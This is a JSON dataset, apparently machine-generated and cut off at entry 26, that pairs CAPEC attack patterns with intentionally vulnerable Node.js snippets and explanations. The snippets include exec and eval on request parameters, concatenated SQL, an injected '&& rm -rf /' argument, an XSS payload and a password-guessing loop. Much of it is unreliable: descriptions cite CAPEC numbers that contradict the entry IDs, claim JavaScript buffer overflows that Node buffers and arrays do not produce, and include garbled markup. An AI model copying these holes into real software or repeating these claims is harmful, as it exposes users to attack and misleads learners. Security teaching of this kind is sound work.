[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Middleware to check if user is authenticated\nfunction isAuthenticated(req, res, next) {\n  if (req.user) {\n    return next();\n  } else {\n    res.status(403).send('Forbidden');\n  }\n}\n\n// Route without proper ACL\napp.get('/admin', (req, res) => {\n  res.send('Welcome to the admin panel');\n});\n\n// Route with proper ACL\napp.get('/secure-admin', isAuthenticated, (req, res) => {\n  res.send('Welcome to the secure admin panel');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server. It demonstrates a common security vulnerability where access to certain functionality is not properly constrained by Access Control Lists (ACLs). The '/admin' route is accessible without any authentication, representing a failure to specify an ACL, which could allow unauthorized users to access sensitive functionality. In contrast, the '/secure-admin' route uses a middleware function 'isAuthenticated' to check if the user is authenticated before granting access, representing a proper implementation of ACLs. This example highlights the importance of correctly implementing access controls to prevent unauthorized access to sensitive parts of an application."
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "const users = { 'user1': { password: 'password123', attempts: 0, locked: false } }; \n\nfunction login(username, password) { \n  if (users[username].locked) { \n    console.log('Account is locked.'); \n    return; \n  } \n  if (users[username].password === password) { \n    console.log('Login successful!'); \n    users[username].attempts = 0; \n  } else { \n    users[username].attempts += 1; \n    if (users[username].attempts >= 3) { \n      users[username].locked = true; \n      console.log('Account locked due to too many failed attempts.'); \n    } else { \n      console.log('Incorrect password.'); \n    } \n  } \n} \n\n// Simulating login attempts \nlogin('user1', 'wrongpassword'); \nlogin('user1', 'wrongpassword'); \nlogin('user1', 'wrongpassword'); \nlogin('user1', 'password123');",
        "description": "This JavaScript code snippet demonstrates a simple login mechanism with an account lockout feature. The 'users' object stores user data, including password, login attempts, and lockout status. The 'login' function checks if the account is locked before allowing login attempts. If the password is correct, the login is successful, and the attempt counter is reset. If the password is incorrect, the attempt counter increments, and the account is locked after three failed attempts. This code embodies the CAPEC idea of 'Inducing Account Lockout' by showing how an attacker can exploit the lockout mechanism to deny service to legitimate users. The related CWEs are represented by the overly restrictive lockout mechanism (CWE-645) and the lack of measures to prevent excessive authentication attempts (CWE-307)."
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "function validateInput(input) {\n  // Early validation before canonicalization\n  if (!/^[a-zA-Z0-9]+$/.test(input)) {\n    throw new Error('Invalid input');\n  }\n  // Canonicalization step\n  input = input.replace(/^\\u200B+/, ''); // Remove leading zero-width space characters\n  // Further processing\n  if (input === 'admin') {\n    console.log('Access granted');\n  } else {\n    console.log('Access denied');\n  }\n}\n\ntry {\n  validateInput('\\u200B\\u200Badmin'); // Ghost characters to bypass validation\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where input validation is performed before canonicalization, allowing an attacker to bypass input filters using leading 'ghost' characters. The `validateInput` function first checks if the input contains only alphanumeric characters. However, it does this before removing any leading zero-width space characters (ghost characters) in the canonicalization step. As a result, an input like '\\u200B\\u200Badmin' (with leading zero-width spaces) can bypass the initial validation and be processed as 'admin', potentially granting unauthorized access. This example embodies the main idea of CAPEC-Using Leading 'Ghost' Character Sequences to Bypass Input Filters and highlights related CWEs such as improper input validation, incorrect behavior order, and improper handling of alternate encoding."
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "const http = require('http');\n\nconst allowedIPs = ['192.168.1.1', '192.168.1.2'];\n\nhttp.createServer((req, res) => {\n  const clientIP = req.connection.remoteAddress;\n  if (!allowedIPs.includes(clientIP)) {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access Denied');\n    return;\n  }\n\n  // Process request\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Hello, World!');\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server that restricts access based on the client's IP address. The server checks if the client's IP address is in the list of allowed IPs. If the IP address is not in the list, the server responds with 'Access Denied'. This code is vulnerable to the 'Using Alternative IP Address Encodings' attack (CAPEC-273) because it relies on a specific format of IP addresses for access control. An attacker could use alternative encodings of the IP address to bypass this check. The code also demonstrates CWE-291 (Reliance on IP Address for Authentication) and CWE-173 (Improper Handling of Alternate Encoding) by not validating the IP address against different possible encodings."
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Simulate improper authorization check\n    if (data.toString() === 'admin_command') {\n      console.log('Admin command executed');\n    } else {\n      console.log('Regular command executed');\n    }\n  });\n\n  // Simulate improper verification of source\n  socket.on('end', () => {\n    console.log('Connection ended');\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\n\n// Simulate a client sending a tone to impersonate a supervisor signal\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  client.write('admin_command');\n  client.end();\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of a Blue Boxing attack using Node.js. The server listens for incoming connections and processes commands without proper authorization checks. When a client sends the 'admin_command', the server executes it without verifying the source or ensuring proper authorization. This represents the core idea of Blue Boxing, where an attacker can send a tone (or command) to impersonate a supervisor signal and gain unauthorized control over the system. The code also highlights related weaknesses such as improper authorization (CWE-285), improper verification of the source (CWE-940), and improper restriction of communication channels (CWE-923)."
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "const http = require('http');\nconst { exec } = require('child_process');\n\nhttp.createServer((req, res) => {\n  const userInput = req.url.split('?cmd=')[1];\n  if (userInput) {\n    exec(userInput, (error, stdout, stderr) => {\n      if (error) {\n        res.writeHead(500, { 'Content-Type': 'text/plain' });\n        res.end(`Error: ${error.message}`);\n        return;\n      }\n      res.writeHead(200, { 'Content-Type': 'text/plain' });\n      res.end(stdout);\n    });\n  } else {\n    res.writeHead(400, { 'Content-Type': 'text/plain' });\n    res.end('No command provided');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It extracts a command from the URL query parameter 'cmd' and executes it using the 'exec' function from the 'child_process' module. This code is vulnerable to OS Command Injection (CWE-78) because it directly uses user input to construct and execute an OS command without proper validation or neutralization. This embodies the main idea of CAPEC-138 (Argument Injection), where an attacker can change the behavior of the application by injecting malicious data through non-validated arguments. The code also touches on related CWEs such as improper neutralization of special elements (CWE-74, CWE-146) and incomplete list of disallowed inputs (CWE-184)."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'test'\n});\n\napp.get('/user', (req, res) => {\n  const userId = req.query.id;\n  const query = `SELECT * FROM users WHERE id = '${userId}'`;\n  connection.query(query, (error, results) => {\n    if (error) {\n      res.send('An error occurred');\n    } else {\n      res.json(results);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a basic Express.js application that is vulnerable to Blind SQL Injection. The application connects to a MySQL database and retrieves user information based on a user-provided ID. The user input is directly included in the SQL query without proper sanitization or validation, making it susceptible to SQL Injection attacks. The error messages are suppressed, but an attacker can still exploit the vulnerability by crafting input that affects the SQL query's execution. This example embodies the main idea of CAPEC-111 (Blind SQL Injection) and highlights related CWEs such as CWE-89 (Improper Neutralization of Special Elements used in an SQL Command), CWE-20 (Improper Input Validation), and CWE-707 (Improper Neutralization)."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "const vulnerableLibrary = require('vulnerable-library');\n\nfunction processData(input) {\n  let buffer = Buffer.alloc(10); // Allocate a buffer of size 10\n  vulnerableLibrary.copyToBuffer(input, buffer); // Vulnerable API call\n}\n\n// Example usage\nlet userInput = 'A'.repeat(20); // User input longer than buffer size\nprocessData(userInput);",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability in an API call, aligning with the CAPEC description. The `vulnerableLibrary` is a hypothetical library that contains a function `copyToBuffer` which copies data to a buffer without checking the size of the input. The `processData` function allocates a buffer of size 10 and then calls the vulnerable API with user input. If the user input exceeds the buffer size, it leads to a buffer overflow. This snippet embodies CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer). The example usage shows how an attacker can exploit this vulnerability by providing an input longer than the allocated buffer size."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction runCommand(userInput) {\n    let buffer = Buffer.alloc(10);\n    if (userInput.length > buffer.length) {\n        console.error('Input too long!');\n        return;\n    }\n    buffer.write(userInput, 0, 'utf-8');\n    exec(buffer.toString(), (error, stdout, stderr) => {\n        if (error) {\n            console.error(`exec error: ${error}`);\n            return;\n        }\n        console.log(`stdout: ${stdout}`);\n        console.error(`stderr: ${stderr}`);\n    });\n}\n\nrunCommand(process.argv[2]);",
        "description": "This JavaScript code snippet demonstrates a vulnerable command-line utility that is susceptible to a buffer overflow attack. The function `runCommand` takes user input, checks if the input length exceeds the buffer size, and writes the input to a buffer. If the input length is greater than the buffer size, it logs an error and returns. However, this simplistic check can be bypassed, leading to potential buffer overflow. The buffer content is then executed as a command using `exec`, which can lead to command injection if the input is not properly sanitized. This snippet embodies the main idea of CAPEC 'Buffer Overflow in Local Command-Line Utilities' and highlights related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input), CWE-20 (Improper Input Validation), and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component)."
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction runCommand() {\n  const envVar = process.env.USER_INPUT;\n  const buffer = Buffer.alloc(50);\n  buffer.write(envVar, 'utf-8');\n  exec(buffer.toString(), (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\nrunCommand();",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability via environment variables. The function `runCommand` reads an environment variable `USER_INPUT` and writes it to a buffer of fixed size (50 bytes) without checking the length of the input. This can lead to a buffer overflow if the environment variable exceeds the buffer size. The buffer content is then executed as a command, which can lead to arbitrary code execution. This snippet embodies the CAPEC 'Buffer Overflow via Environment Variables' and highlights related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input), CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer), and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  let filePath = path.join(__dirname, 'public', req.url);\n  let extname = path.extname(filePath);\n  let contentType = 'text/html';\n\n  switch (extname) {\n    case '.js':\n      contentType = 'text/javascript';\n      break;\n    case '.css':\n      contentType = 'text/css';\n      break;\n    case '.json':\n      contentType = 'application/json';\n      break;\n    case '.png':\n      contentType = 'image/png';\n      break;\n    case '.jpg':\n      contentType = 'image/jpg';\n      break;\n    case '.wav':\n      contentType = 'audio/wav';\n      break;\n  }\n\n  fs.readFile(filePath, (error, content) => {\n    if (error) {\n      if (error.code == 'ENOENT') {\n        fs.readFile('./404.html', (error, content) => {\n          res.writeHead(200, { 'Content-Type': 'text/html' });\n          res.end(content, 'utf-8');\n        });\n      } else {\n        res.writeHead(500);\n        res.end('Sorry, check with the site admin for error: ' + error.code + ' ..\\n');\n        res.end();\n      }\n    } else {\n      res.writeHead(200, { 'Content-Type': contentType });\n      res.end(content, 'utf-8');\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://127.0.0.1:3000/');\n});",
        "description": "This JavaScript code snippet creates a basic HTTP server using Node.js. The server reads files from the 'public' directory based on the URL requested by the client. The file extension is used to determine the content type, which is then set in the response header. This code is vulnerable to the 'Cause Web Server Misclassification' attack described in the CAPEC. Specifically, it relies on the file extension to determine the content type (CWE-646), and it does not properly restrict the file names or paths (CWE-641). An attacker could exploit this by requesting files with unexpected extensions or paths, potentially causing the server to misclassify the file type and take unintended actions, such as serving raw content or executing unintended scripts."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "const multicastChannel = new MulticastChannel();\n\n// Function to send a message to a specific client\nfunction sendMessage(clientId, message) {\n  const messageId = `client-${clientId}`;\n  const payload = {\n    id: messageId,\n    data: message\n  };\n  multicastChannel.send(payload);\n}\n\n// Function to receive messages\nfunction receiveMessage() {\n  multicastChannel.on('message', (payload) => {\n    const { id, data } = payload;\n    // Missing authentication for critical function\n    if (id.startsWith('client-')) {\n      const clientId = id.split('-')[1];\n      console.log(`Message for client ${clientId}: ${data}`);\n    }\n  });\n}\n\n// Example usage\nsendMessage(1, 'Sensitive data for client 1');\nreceiveMessage();",
        "description": "This JavaScript code snippet demonstrates a multicast communication channel where messages are sent to specific clients based on their identifiers. The `sendMessage` function constructs a message payload with a client-specific identifier and sends it via the multicast channel. The `receiveMessage` function listens for incoming messages and processes them based on the client identifier. The code embodies the CAPEC 'Choosing Message Identifier' by showing how an attacker could potentially intercept or manipulate messages intended for other clients. The snippet also highlights several related CWEs: the lack of authentication for critical functions (CWE-306), the potential for sensitive information to be included in sent data (CWE-201), and the improper enforcement of message integrity (CWE-924)."
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// Vulnerable to CWE-73: External Control of File Name or Path\nconst filePath = process.env.FILE_PATH;\n\n// Vulnerable to CWE-20: Improper Input Validation\nif (!filePath) {\n  console.error('FILE_PATH environment variable is not set.');\n  process.exit(1);\n}\n\n// Vulnerable to CWE-74: Injection\nexec(`cat ${filePath}`, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`Error executing command: ${error.message}`);\n    return;\n  }\n  console.log(`File content: ${stdout}`);\n});\n\n// Vulnerable to CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nconst sensitiveData = process.env.SENSITIVE_DATA;\nconsole.log(`Sensitive Data: ${sensitiveData}`);",
        "description": "This JavaScript code snippet demonstrates a scenario where environment variables are subverted to cause the target software to deviate from its expected operation. The code reads a file path from an environment variable (CWE-73: External Control of File Name or Path) and executes a shell command to display the file's content without proper input validation (CWE-20: Improper Input Validation). This can lead to command injection (CWE-74: Injection). Additionally, it logs sensitive data from an environment variable, potentially exposing it to unauthorized actors (CWE-200: Exposure of Sensitive Information to an Unauthorized Actor). This snippet embodies the main idea of CAPEC-15 by showing how an adversary can manipulate environment variables to alter the behavior of the software."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  let buffer = Buffer.alloc(10);\n  let input = queryObject.input;\n\n  // CWE-120: Buffer Copy without Checking Size of Input\n  if (input) {\n    buffer.write(input, 'utf-8');\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.end('<html><body><h1>Buffer Overflow Example</h1></body></html>');\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server that listens on port 8080. The server parses the URL query parameters and writes the 'input' parameter to a buffer of fixed size (10 bytes) without checking the size of the input. This demonstrates a classic buffer overflow vulnerability (CWE-120). An attacker can exploit this by sending a specially crafted request with a long 'input' parameter, causing a buffer overflow. This snippet embodies the main idea of the CAPEC by showing how a client-side application (in this case, a server handling HTTP requests) can be vulnerable to buffer overflow attacks through improper input handling."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction executeCommand(userInput) {\n    // Vulnerable to command injection due to improper neutralization of special elements\n    const command = `ls ${userInput}`;\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            console.error(`Error: ${error.message}`);\n            return;\n        }\n        if (stderr) {\n            console.error(`Stderr: ${stderr}`);\n            return;\n        }\n        console.log(`Stdout: ${stdout}`);\n    });\n}\n\n// Example usage\nexecuteCommand('&& rm -rf /');",
        "description": "This JavaScript code snippet demonstrates a command injection vulnerability. The `executeCommand` function takes user input and concatenates it directly into a shell command without proper neutralization of special elements. This allows an attacker to inject arbitrary commands by using command delimiters. For example, passing '&& rm -rf /' as user input would execute a destructive command to delete the root directory. This snippet embodies the main idea of CAPEC-88 (Command Delimiters) and highlights related CWEs such as CWE-77 (Command Injection) and CWE-78 (OS Command Injection)."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "const users = { 'user1': 'password123', 'user2': 'qwerty', 'user3': 'letmein' }; // CWE-521: Weak Password Requirements\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username] === password) {\n    return 'Access granted';\n  } else {\n    return 'Access denied';\n  }\n}\n\n// CWE-307: No restriction on excessive authentication attempts\nfunction dictionaryAttack(username, dictionary) {\n  for (let i = 0; i < dictionary.length; i++) {\n    if (authenticate(username, dictionary[i]) === 'Access granted') {\n      return `Password found: ${dictionary[i]}`;\n    }\n  }\n  return 'Password not found';\n}\n\nconst dictionary = ['123456', 'password', '123456789', 'password123', 'qwerty', 'letmein'];\nconsole.log(dictionaryAttack('user1', dictionary)); // Example attack\n",
        "description": "This JavaScript code snippet demonstrates a dictionary-based password attack (CAPEC-16) by attempting to authenticate a user with a list of common passwords. The 'users' object contains weak passwords (CWE-521). The 'authenticate' function checks if the provided username and password match any entry in the 'users' object. The 'dictionaryAttack' function iterates through a list of common passwords (dictionary) and tries to authenticate the user with each password. If a match is found, it returns the password; otherwise, it continues until the list is exhausted. This code lacks measures to prevent excessive authentication attempts (CWE-307), making it vulnerable to brute force attacks."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst fs = require('fs');\nconst app = express();\n\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.uploadedFile;\n  let uploadPath = __dirname + '/uploads/' + uploadedFile.name;\n\n  // Incorrect Permission Assignment for Critical Resource (CWE-732)\n  fs.writeFile(uploadPath, uploadedFile.data, { mode: 0o777 }, (err) => {\n    if (err) return res.status(500).send(err);\n\n    // Improper Authorization (CWE-285)\n    if (req.user.role !== 'admin') {\n      return res.status(403).send('Unauthorized');\n    }\n\n    // Privilege Context Switching Error (CWE-270)\n    process.setuid(0); // Switch to root user\n    // Perform some privileged operation\n    process.setuid(process.env.USER_ID); // Switch back to original user\n\n    res.send('File uploaded!');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple file upload service. The code demonstrates several vulnerabilities related to the CAPEC 'Using Malicious Files' and the associated CWEs:\n\n1. **Incorrect Permission Assignment for Critical Resource (CWE-732)**: The uploaded file is saved with permissions set to 777, allowing any user to read, write, or execute the file, which is insecure.\n\n2. **Improper Authorization (CWE-285)**: The code checks if the user has an 'admin' role after the file has been uploaded, which is too late. The authorization check should be done before any file operations.\n\n3. **Privilege Context Switching Error (CWE-270)**: The code switches to the root user to perform some privileged operation and then switches back to the original user. This can be exploited if not handled correctly.\n\nThe code represents the main idea of the CAPEC by showing how improper handling of file uploads and permissions can lead to security vulnerabilities."
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "<html>\n<body>\n  <img src=\"x\" onerror=\"alert('XSS Attack!')\">\n  <!-- < !-CDATA-[<script>alert('XSS Attack!')</script>]] -->\n</body>\n</html>",
        "description": "This code snippet demonstrates an XSS attack targeting non-script elements, specifically an <img> tag and a comment section. The <img> tag includes an 'onerror' attribute that executes a JavaScript alert when the image fails to load, which is a common XSS vector. Additionally, a comment section contains a script embedded within a CDATA block, which is another method to bypass input validation. This example highlights the vulnerabilities described in the CAPEC and related CWEs, such as improper neutralization of script-related HTML tags (CWE-80), script in attributes of IMG tags (CWE-82), and incomplete denylist mechanisms (CWE-692)."
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  if (queryObject.script) {\n    try {\n      eval(queryObject.script); // CWE-284, CWE-79, CWE-506\n    } catch (e) {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Error executing script');\n      return;\n    }\n  }\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Script executed');\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It parses the URL query parameters and checks if a 'script' parameter is present. If so, it attempts to execute the script using the 'eval' function. This embodies the CAPEC 'Embedding Scripts within Scripts' by allowing an adversary to embed and execute their own script within the server's context. The use of 'eval' here is particularly dangerous and represents several CWEs: CWE-284 (Improper Access Control) as it does not restrict script execution, CWE-79 (Cross-site Scripting) as it can execute arbitrary scripts, and CWE-506 (Embedded Malicious Code) as it can run potentially malicious code. This code is highly vulnerable and should not be used in production."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "const crypto = require('crypto');\n\nconst algorithm = 'aes-128-cbc';\nconst key = '1234567890123456'; // CWE-321: Hard-coded cryptographic key\nconst iv = Buffer.alloc(16, 0); // CWE-1204: Weak IV (all zeros)\n\nconst encrypt = (text) => {\n  const cipher = crypto.createCipheriv(algorithm, key, iv);\n  let encrypted = cipher.update(text, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n};\n\nconst decrypt = (encrypted) => {\n  const decipher = crypto.createDecipheriv(algorithm, key, iv);\n  let decrypted = decipher.update(encrypted, 'hex', 'utf8');\n  decrypted += decipher.final('utf8');\n  return decrypted;\n};\n\nconst plaintext = 'Sensitive Data';\nconst ciphertext = encrypt(plaintext);\nconsole.log('Encrypted:', ciphertext);\nconsole.log('Decrypted:', decrypt(ciphertext));",
        "description": "This JavaScript code snippet demonstrates a vulnerable encryption implementation. It uses the AES-128-CBC algorithm with a hard-coded cryptographic key (CWE-321) and a weak initialization vector (IV) that is not sufficiently unpredictable (CWE-1204). The code encrypts and decrypts a plaintext string, but due to the hard-coded key and weak IV, it is susceptible to brute force attacks as described in the CAPEC. An attacker with access to the ciphertext and knowledge of the encryption algorithm could perform an exhaustive search on the key space to determine the key and decrypt the ciphertext."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\napp.get('/login', (req, res) => {\n  const sessionId = '12345'; // CWE-6: Insufficient Session-ID Length\n  res.cookie('sessionId', sessionId, { httpOnly: true, secure: false }); // CWE-539: Persistent Cookies Containing Sensitive Information\n  res.send('Logged in');\n});\n\napp.get('/secure-data', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  if (sessionId === '12345') { // CWE-290: Authentication Bypass by Spoofing\n    res.send('Sensitive Data');\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a simple Express.js application that is vulnerable to the exploitation of trusted identifiers. The '/login' endpoint sets a session ID cookie with a fixed value ('12345'), which is an example of CWE-6 (Insufficient Session-ID Length) and CWE-539 (Persistent Cookies Containing Sensitive Information). The '/secure-data' endpoint checks the session ID from the cookie to grant access to sensitive data. This check is vulnerable to CWE-290 (Authentication Bypass by Spoofing) because an attacker can easily guess or obtain the session ID and gain unauthorized access. The code represents the main idea of CAPEC by showing how an adversary can exploit trusted identifiers to perform authorized actions under the guise of an authenticated user."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\n// Improper Authentication\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'admin') {\n    // Authentication Bypass by Spoofing\n    res.send('Login successful');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// Exposure of Sensitive Information\napp.get('/user/:id', (req, res) => {\n  const userId = req.params.id;\n  // Improper Input Validation\n  if (userId) {\n    res.send(`User data for user ${userId}`);\n  } else {\n    res.status(400).send('Invalid user ID');\n  }\n});\n\napp.listen(port, () => {\n  console.log(`Server running at http://localhost:${port}/`);\n});",
        "description": "This JavaScript code snippet demonstrates a simple Express.js server with vulnerabilities that align with the CAPEC 'Exploiting Trust in Client' and related CWEs. The '/login' endpoint contains an Improper Authentication vulnerability (CWE-287) by not properly verifying the password, allowing an attacker to spoof authentication (CWE-290). The '/user/:id' endpoint exposes sensitive information (CWE-200) without proper authorization checks and lacks proper input validation (CWE-20), making it susceptible to attacks. These vulnerabilities illustrate how an attacker can exploit trust in client-server communication."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst fs = require('fs');\nconst path = require('path');\n\nconst app = express();\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.file;\n  let uploadPath = path.join(__dirname, 'uploads', uploadedFile.name);\n\n  // Save the file without validating its type or content\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) {\n      return res.status(500).send(err);\n    }\n    res.send('File uploaded!');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework and the express-fileupload middleware to create a simple file upload server. The server accepts file uploads via a POST request to the '/upload' endpoint. The uploaded file is saved to the 'uploads' directory without any validation of its type or content. This embodies the main idea of the CAPEC 'File Content Injection' by allowing an adversary to upload potentially malicious files. The code demonstrates several related CWEs: CWE-20 (Improper Input Validation) by not validating the uploaded file's content, CWE-434 (Unrestricted Upload of File with Dangerous Type) by allowing any file type to be uploaded, and CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) by saving the file based on its original name and extension."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "function processInput(input) {\n    var buffer = new Array(10);\n    for (var i = 0; i < input.length; i++) {\n        buffer[i] = input[i]; // CWE-120: No size check\n    }\n    // Filter that fails to handle oversized input securely\n    if (buffer.includes('<script>')) { // CWE-74: Improper Neutralization\n        console.log('Malicious input detected!');\n    } else {\n        console.log('Input is safe.');\n    }\n}\n\n// Example of an oversized input causing buffer overflow\nvar maliciousInput = 'A'.repeat(20) + '<script>alert(1)</script>';\nprocessInput(maliciousInput);",
        "description": "This JavaScript code snippet demonstrates a filter failure through buffer overflow. The `processInput` function takes an input string and attempts to copy it into a fixed-size buffer without checking the input size, leading to a classic buffer overflow (CWE-120). The filter then checks for a specific malicious pattern (`<script>`) but fails to handle oversized input securely (CWE-74). The example input `maliciousInput` is designed to overflow the buffer and potentially bypass the filter, illustrating the vulnerability described in the CAPEC."
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "const lockA = { locked: false };\nconst lockB = { locked: false };\n\nfunction acquireLock(lock) {\n  return new Promise((resolve) => {\n    (function waitForLock() {\n      if (!lock.locked) {\n        lock.locked = true;\n        resolve();\n      } else {\n        setTimeout(waitForLock, 10);\n      }\n    })();\n  });\n}\n\nasync function task1() {\n  await acquireLock(lockA);\n  console.log('Task 1 acquired lockA');\n  await new Promise(resolve => setTimeout(resolve, 100)); // Simulate work\n  await acquireLock(lockB);\n  console.log('Task 1 acquired lockB');\n  lockB.locked = false;\n  lockA.locked = false;\n}\n\nasync function task2() {\n  await acquireLock(lockB);\n  console.log('Task 2 acquired lockB');\n  await new Promise(resolve => setTimeout(resolve, 100)); // Simulate work\n  await acquireLock(lockA);\n  console.log('Task 2 acquired lockA');\n  lockA.locked = false;\n  lockB.locked = false;\n}\n\ntask1();\ntask2();",
        "description": "This JavaScript code snippet demonstrates a forced deadlock scenario. Two tasks, `task1` and `task2`, attempt to acquire two locks, `lockA` and `lockB`, in different orders. `task1` first acquires `lockA` and then tries to acquire `lockB`, while `task2` first acquires `lockB` and then tries to acquire `lockA`. If `task1` acquires `lockA` and `task2` acquires `lockB` before either can acquire the second lock, a deadlock occurs because each task is waiting for the other to release a lock. This snippet embodies the main idea of CAPEC-133 (Forced Deadlock) and illustrates related CWEs such as CWE-833 (Deadlock) and CWE-667 (Improper Locking)."
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
